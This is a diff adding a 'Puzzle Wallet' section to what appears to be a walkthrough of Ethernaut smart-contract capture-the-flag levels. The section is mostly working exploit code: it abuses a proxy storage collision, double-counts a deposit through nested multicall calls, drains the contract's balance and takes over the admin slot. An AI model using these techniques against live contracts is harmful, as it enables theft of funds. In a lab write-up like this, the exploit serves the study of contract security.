@@ -319,3 +319,45 @@ This should drain token2
 ```
 await contract.swap(evlToken, t2, 200)
 ```
+## Puzzle Wallet
+The main vulnerabiltiy in this level is storage collision. 
+To solve this level we first have to import API for one of the contracts 
+```
+functionSignature = {
+    name: 'proposeNewAdmin',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: '_newAdmin'
+        }
+    ]
+}
+
+params = [player]
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+
+await web3.eth.sendTransaction({from: player, to: instance, data})
+```
+Now we whitelist our player 
+```
+await contract.addToWhitelist(player)
+```
+We econde the functions 
+```
+// deposit() method
+depositData = await contract.methods["deposit()"].request().then(v => v.data)
+
+// multicall() method with param of deposit function call signature
+multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
+```
+```
+await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
+
+```
+Withdraw  and set max balance and submit 
+```
+await contract.execute(player, toWei('0.002'), 0x0)
+await contract.setMaxBalance(player)
+```
